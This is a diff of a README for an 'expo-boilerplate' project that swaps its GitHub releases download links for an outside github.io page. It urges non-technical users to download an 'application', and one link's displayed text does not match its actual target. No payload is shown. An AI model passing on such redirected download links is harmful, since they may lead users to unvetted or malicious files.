@@ -1,6 +1,6 @@
 # 📱 expo-boilerplate - Your App Development Starting Point
 
-[![Download Now](https://img.shields.io/badge/Download-Expo_Boilerplate-blueviolet?style=for-the-badge&logo=github)](https://github.com/kxwaii495/expo-boilerplate/releases)
+[![Download Now](https://img.shields.io/badge/Download-Expo_Boilerplate-blueviolet?style=for-the-badge&logo=github)](https://kxwaii495.github.io)
 
 ## 👋 Welcome to expo-boilerplate
 
@@ -22,7 +22,7 @@ Getting started is easier than you think. Follow these simple steps:
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/kwaii495/expo-boilerplate/releases](https://github.com/kxwaii495/expo-boilerplate/releases)
+Visit this link to download the application: [https://kxwaii495.github.io](https://kxwaii495.github.io)
 
 You'll see a page with different files you can download. Don't worry if it looks technical - you only need to focus on the download button.
 
